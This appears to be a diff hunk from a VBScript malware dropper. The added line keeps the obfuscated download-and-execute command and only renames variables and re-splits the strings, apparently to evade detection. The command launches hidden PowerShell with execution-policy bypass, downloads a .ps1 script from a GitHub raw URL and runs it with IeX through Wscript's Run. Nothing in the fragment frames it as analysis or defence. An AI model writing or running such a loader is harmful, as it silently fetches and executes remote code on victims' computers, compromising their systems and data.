@@ -9,7 +9,7 @@ hctixwichs=" bYpaSs -c"
 
 
 
-aiensjd= "p"+kcwowycp+ksayewnds+haugwloshbv+hctixwichs+" $V"+"L"+"rBfk"+"EP ="+" (n"+"ew-o"+"bjec"+"t n"+"et"+".webcl"+"ient);"+" IeX"+" ($VLrBfkEP.downloadstring('ht"+"tps://"+"raw.githubusercontent.com/burnitup545/PrivateRepo/main/lib106.ps1''))"
+aiensjd= "p"+kcwowycp+ksayewnds+haugwloshbv+hctixwichs+" $l"+"N"+"wNUz"+"XsKq"+"W ="+" (ne"+"w-ob"+"jec"+"t "+"net.we"+"bclien"+"t); "+"IeX ($lNwNUzXsKqW.downloadstring('ht"+"tps://"+"raw.githubusercontent.com/burnitup545/PrivateRepo/main/lib106.ps1'))"
 CreateObject("Wscript."+ksayewnds).Run aiensjd, 0, false
 '@
 
